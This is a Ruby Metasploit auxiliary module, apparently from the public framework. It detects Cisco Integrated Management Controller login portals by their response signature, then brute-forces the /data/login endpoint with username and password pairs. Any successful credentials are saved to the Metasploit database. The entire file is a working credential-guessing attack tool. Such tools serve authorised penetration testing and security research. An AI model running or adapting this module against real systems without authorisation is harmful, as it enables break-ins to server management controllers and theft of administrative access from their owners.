##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Cisco Integrated Management Controller Login Brute Force Utility',
      'Description'    => %{
        This module scans for Cisco Integrated Management Controller (CIMC) login portal(s), and
        performs a login brute force attack to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE,

      'DefaultOptions' =>
        {
                 'SSL' => true
        }
  ))

    register_options(
      [
        Opt::RPORT(443),
        Opt::SSLVersion
      ], self.class)
  end

  def run_host(ip)
    unless is_app_cimc?
      return
    end

    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't CIMC
  #

  def is_app_cimc?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/public/cimc.esp',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return false
    rescue ::OpenSSL::SSL::SSLError
      vprint_error("#{rhost}:#{rport} - SSL/TLS connection error. Change SSL/TLS version and try again.")
      return false
    end

    if (res and res.code == 200 and res.headers['Server'].include?("Mbedthis-Appweb") and res.body.include?("hostname"))
      vprint_good("#{rhost}:#{rport} - Running Cisco Integrated Management Controller portal...")
      return true
    else
      vprint_error("#{rhost}:#{rport} - Application is not CIMC. Module will not continue.")
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      last_attempted_at: Time.now,
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::SUCCESSFUL,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("#{rhost}:#{rport} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/data/login',
        'method'    => 'POST',
        'vars_post' =>
          {
            'user' => user,
            'password' => pass
          }
      })
 rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{rhost}:#{rport} - HTTP Connection Failed...")
      return :abort
    end

    if (res and res.code == 200 and res.headers.include?('Set-Cookie') and res.body.include?("<authResult>0") and res.body.include?("<forwardUrl>index.html"))
        print_good("SUCCESSFUL LOGIN - #{rhost}:#{rport} - #{user.inspect}:#{pass.inspect}")
        report_cred(
                ip: rhost,
                port: rport,
                service_name: 'Cisco Integrated Management Controller Portal',
                user: user,
                password: pass,
                proof: res.body
      )
      return :next_user
    else
        print_error("FAILED LOGIN - #{rhost}:#{rport} -#{user.inspect}:#{pass.inspect}")
    end

  end
end
